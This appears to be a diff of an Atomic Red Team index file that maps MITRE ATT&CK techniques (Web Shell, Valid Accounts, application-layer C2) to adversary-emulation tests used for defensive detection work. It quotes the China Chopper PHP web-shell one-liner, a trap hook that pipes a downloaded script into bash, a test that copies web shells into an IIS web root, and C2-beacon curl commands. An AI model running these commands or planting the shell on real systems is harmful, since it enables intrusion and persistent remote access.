@@ -364,58 +364,81 @@ persistence:
               }
   '':
     technique:
-      id: attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df
+      id: attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Web Shell
-      description: |-
-        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)
-
-        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
+      name: Valid Accounts
+      description: "Adversaries may steal the credentials of a specific user or service
+        account using Credential Access techniques or capture credentials earlier
+        in their reconnaissance process through social engineering for means of gaining
+        Initial Access. \n\nCompromised credentials may be used to bypass access controls
+        placed on various resources on systems within the network and may even be
+        used for persistent access to remote systems and externally available services,
+        such as VPNs, Outlook Web Access and remote desktop. Compromised credentials
+        may also grant an adversary increased privilege to specific systems or access
+        to restricted areas of the network. Adversaries may choose not to use malware
+        or tools in conjunction with the legitimate access those credentials provide
+        to make it harder to detect their presence.\n\nAdversaries may also create
+        accounts, sometimes using pre-defined account names and passwords, as a means
+        for persistence through backup access in case other means are unsuccessful.
+        \n\nThe overlap of credentials and permissions across a network of systems
+        is of concern because the adversary may be able to pivot across accounts and
+        systems to reach a high level of access (i.e., domain or enterprise administrator)
+        to bypass access controls set within the enterprise. (Citation: TechNet Credential
+        Theft)"
       external_references:
-      - external_id: T1100
-        url: https://attack.mitre.org/techniques/T1100
+      - external_id: T1078
+        url: https://attack.mitre.org/techniques/T1078
         source_name: mitre-attack
-      - url: https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
-        description: Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down
-          the China Chopper Web Shell - Part I. Retrieved March 27, 2015.
-        source_name: Lee 2013
-      - url: https://www.us-cert.gov/ncas/alerts/TA15-314A
-        description: US-CERT. (2015, November 13). Compromised Web Servers and Web
-          Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.
-        source_name: US-CERT Alert TA15-314A Web Shells
+      - external_id: CAPEC-560
+        url: https://capec.mitre.org/data/definitions/560.html
+        source_name: capec
+      - url: https://technet.microsoft.com/en-us/library/dn535501.aspx
+        description: Microsoft. (2016, April 15). Attractive Accounts for Credential
+          Theft. Retrieved June 3, 2016.
+        source_name: TechNet Credential Theft
+      - url: https://technet.microsoft.com/en-us/library/dn487457.aspx
+        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
+          June 3, 2016.
+        source_name: TechNet Audit Policy
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
       x_mitre_data_sources:
-      - Anti-virus
       - Authentication logs
-      - File monitoring
-      - Netflow/Enclave netflow
       - Process monitoring
+      x_mitre_defense_bypassed:
+      - Firewall
+      - Host intrusion prevention systems
+      - Network intrusion detection system
+      - Process whitelisting
+      - System access controls
+      - Anti-virus
       x_mitre_detection: |-
-        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)
+        Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
 
-        <code><?php @eval($_POST['password']);></code>
-
-        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
-      x_mitre_effective_permissions:
-      - SYSTEM
+        Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.
+      x_mitre_permissions_required:
       - User
+      - Administrator
+      x_mitre_effective_permissions:
+      - User
+      - Administrator
       x_mitre_platforms:
       - Linux
-      - Windows
       - macOS
-      x_mitre_system_requirements:
-      - Adversary access to Web server with vulnerability or account to upload and
-        serve the Web shell file.
+      - Windows
       type: attack-pattern
       kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
       - phase_name: persistence
         kill_chain_name: mitre-attack
       - phase_name: privilege-escalation
         kill_chain_name: mitre-attack
+      - phase_name: initial-access
+        kill_chain_name: mitre-attack
       modified: '2018-10-17T00:14:20.652Z'
-      created: '2017-05-31T21:31:13.061Z'
+      created: '2017-05-31T21:31:00.645Z'
     atomic_tests: []
   T1103:
     technique:
@@ -3622,6 +3645,83 @@ persistence:
           trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
           exit
           trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+  T1100:
+    technique:
+      id: attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Web Shell
+      description: |-
+        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)
+
+        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
+      external_references:
+      - external_id: T1100
+        url: https://attack.mitre.org/techniques/T1100
+        source_name: mitre-attack
+      - url: https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
+        description: Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down
+          the China Chopper Web Shell - Part I. Retrieved March 27, 2015.
+        source_name: Lee 2013
+      - url: https://www.us-cert.gov/ncas/alerts/TA15-314A
+        description: US-CERT. (2015, November 13). Compromised Web Servers and Web
+          Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.
+        source_name: US-CERT Alert TA15-314A Web Shells
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Anti-virus
+      - Authentication logs
+      - File monitoring
+      - Netflow/Enclave netflow
+      - Process monitoring
+      x_mitre_detection: |-
+        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)
+
+        <code><?php @eval($_POST['password']);></code>
+
+        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
+      x_mitre_effective_permissions:
+      - SYSTEM
+      - User
+      x_mitre_platforms:
+      - Linux
+      - Windows
+      - macOS
+      x_mitre_system_requirements:
+      - Adversary access to Web server with vulnerability or account to upload and
+        serve the Web shell file.
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:13.061Z'
+      identifier: T1100
+    atomic_tests:
+    - name: Web Shell Written to Disk
+      description: |
+        This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
+        Idea from APTSimulator.
+        cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+      supported_platforms:
+      - windows
+      input_arguments:
+        web_shell_path:
+          description: The path to drop the web shell
+          type: string
+          default: C:\inetpub\wwwroot
+        web_shells:
+          description: Path of Web Shell
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1100\shells\
+      executor:
+        name: command_prompt
+        command: 'xcopy #{web_shells} #{web_shell_path}
+
+'
   T1084:
     technique:
       id: attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4
@@ -9506,58 +9606,81 @@ privilege-escalation:
 '
   '':
     technique:
-      id: attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df
+      id: attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Web Shell
-      description: |-
-        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)
-
-        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
+      name: Valid Accounts
+      description: "Adversaries may steal the credentials of a specific user or service
+        account using Credential Access techniques or capture credentials earlier
+        in their reconnaissance process through social engineering for means of gaining
+        Initial Access. \n\nCompromised credentials may be used to bypass access controls
+        placed on various resources on systems within the network and may even be
+        used for persistent access to remote systems and externally available services,
+        such as VPNs, Outlook Web Access and remote desktop. Compromised credentials
+        may also grant an adversary increased privilege to specific systems or access
+        to restricted areas of the network. Adversaries may choose not to use malware
+        or tools in conjunction with the legitimate access those credentials provide
+        to make it harder to detect their presence.\n\nAdversaries may also create
+        accounts, sometimes using pre-defined account names and passwords, as a means
+        for persistence through backup access in case other means are unsuccessful.
+        \n\nThe overlap of credentials and permissions across a network of systems
+        is of concern because the adversary may be able to pivot across accounts and
+        systems to reach a high level of access (i.e., domain or enterprise administrator)
+        to bypass access controls set within the enterprise. (Citation: TechNet Credential
+        Theft)"
       external_references:
-      - external_id: T1100
-        url: https://attack.mitre.org/techniques/T1100
+      - external_id: T1078
+        url: https://attack.mitre.org/techniques/T1078
         source_name: mitre-attack
-      - url: https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
-        description: Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down
-          the China Chopper Web Shell - Part I. Retrieved March 27, 2015.
-        source_name: Lee 2013
-      - url: https://www.us-cert.gov/ncas/alerts/TA15-314A
-        description: US-CERT. (2015, November 13). Compromised Web Servers and Web
-          Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.
-        source_name: US-CERT Alert TA15-314A Web Shells
+      - external_id: CAPEC-560
+        url: https://capec.mitre.org/data/definitions/560.html
+        source_name: capec
+      - url: https://technet.microsoft.com/en-us/library/dn535501.aspx
+        description: Microsoft. (2016, April 15). Attractive Accounts for Credential
+          Theft. Retrieved June 3, 2016.
+        source_name: TechNet Credential Theft
+      - url: https://technet.microsoft.com/en-us/library/dn487457.aspx
+        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
+          June 3, 2016.
+        source_name: TechNet Audit Policy
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
       x_mitre_data_sources:
-      - Anti-virus
       - Authentication logs
-      - File monitoring
-      - Netflow/Enclave netflow
       - Process monitoring
+      x_mitre_defense_bypassed:
+      - Firewall
+      - Host intrusion prevention systems
+      - Network intrusion detection system
+      - Process whitelisting
+      - System access controls
+      - Anti-virus
       x_mitre_detection: |-
-        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)
+        Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
 
-        <code><?php @eval($_POST['password']);></code>
-
-        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
-      x_mitre_effective_permissions:
-      - SYSTEM
+        Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.
+      x_mitre_permissions_required:
       - User
+      - Administrator
+      x_mitre_effective_permissions:
+      - User
+      - Administrator
       x_mitre_platforms:
       - Linux
-      - Windows
       - macOS
-      x_mitre_system_requirements:
-      - Adversary access to Web server with vulnerability or account to upload and
-        serve the Web shell file.
+      - Windows
       type: attack-pattern
       kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
       - phase_name: persistence
         kill_chain_name: mitre-attack
       - phase_name: privilege-escalation
         kill_chain_name: mitre-attack
+      - phase_name: initial-access
+        kill_chain_name: mitre-attack
       modified: '2018-10-17T00:14:20.652Z'
-      created: '2017-05-31T21:31:13.061Z'
+      created: '2017-05-31T21:31:00.645Z'
     atomic_tests: []
   T1103:
     technique:
@@ -11165,6 +11288,83 @@ privilege-escalation:
         command: |
           sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
           sudo visudo -c -f /etc/sudoers
+  T1100:
+    technique:
+      id: attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Web Shell
+      description: |-
+        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)
+
+        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
+      external_references:
+      - external_id: T1100
+        url: https://attack.mitre.org/techniques/T1100
+        source_name: mitre-attack
+      - url: https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
+        description: Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down
+          the China Chopper Web Shell - Part I. Retrieved March 27, 2015.
+        source_name: Lee 2013
+      - url: https://www.us-cert.gov/ncas/alerts/TA15-314A
+        description: US-CERT. (2015, November 13). Compromised Web Servers and Web
+          Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.
+        source_name: US-CERT Alert TA15-314A Web Shells
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Anti-virus
+      - Authentication logs
+      - File monitoring
+      - Netflow/Enclave netflow
+      - Process monitoring
+      x_mitre_detection: |-
+        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)
+
+        <code><?php @eval($_POST['password']);></code>
+
+        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
+      x_mitre_effective_permissions:
+      - SYSTEM
+      - User
+      x_mitre_platforms:
+      - Linux
+      - Windows
+      - macOS
+      x_mitre_system_requirements:
+      - Adversary access to Web server with vulnerability or account to upload and
+        serve the Web shell file.
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:13.061Z'
+      identifier: T1100
+    atomic_tests:
+    - name: Web Shell Written to Disk
+      description: |
+        This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
+        Idea from APTSimulator.
+        cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+      supported_platforms:
+      - windows
+      input_arguments:
+        web_shell_path:
+          description: The path to drop the web shell
+          type: string
+          default: C:\inetpub\wwwroot
+        web_shells:
+          description: Path of Web Shell
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1100\shells\
+      executor:
+        name: command_prompt
+        command: 'xcopy #{web_shells} #{web_shell_path}
+
+'
 discovery:
   T1087:
     technique:
@@ -19729,6 +19929,88 @@ command-and-control:
           Set-Location $datePath
           certutil -verifyctl -split -f #{remote_file}
           Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
+  T1071:
+    technique:
+      id: attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Standard Application Layer Protocol
+      description: |-
+        Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.
+
+        For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.
+      external_references:
+      - external_id: T1071
+        url: https://attack.mitre.org/techniques/T1071
+        source_name: mitre-attack
+      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        source_name: University of Birmingham C2
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Packet capture
+      - Netflow/Enclave netflow
+      - Process use of network
+      - Malware reverse engineering
+      - Process monitoring
+      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
+        sending significantly more data than it receives from a server). Processes
+        utilizing the network that do not normally have network communication or have
+        never been seen before are suspicious. Analyze packet contents to detect application
+        layer protocols that do not follow the expected protocol for the port that
+        is being used. (Citation: University of Birmingham C2)'
+      x_mitre_network_requirements: true
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: command-and-control
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:30:56.776Z'
+      identifier: T1071
+    atomic_tests:
+    - name: Malicious User Agents
+      description: |
+        This test simulates an infected host beaconing to command and control.
+        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: www.google.com
+      executor:
+        name: powershell
+        command: |
+          Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
+          Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
+          Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
+          Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
+    - name: Malicious User Agents - Nix
+      description: |
+        This test simulates an infected host beaconing to command and control.
+        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: www.google.com
+      executor:
+        name: sh
+        command: |
+          curl -s -A "HttpBrowser/1.0" -m3 #{domain}
+          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
+          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
+          curl -s -A "*<|>*" -m3 #{domain}
   T1065:
     technique:
       id: attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0
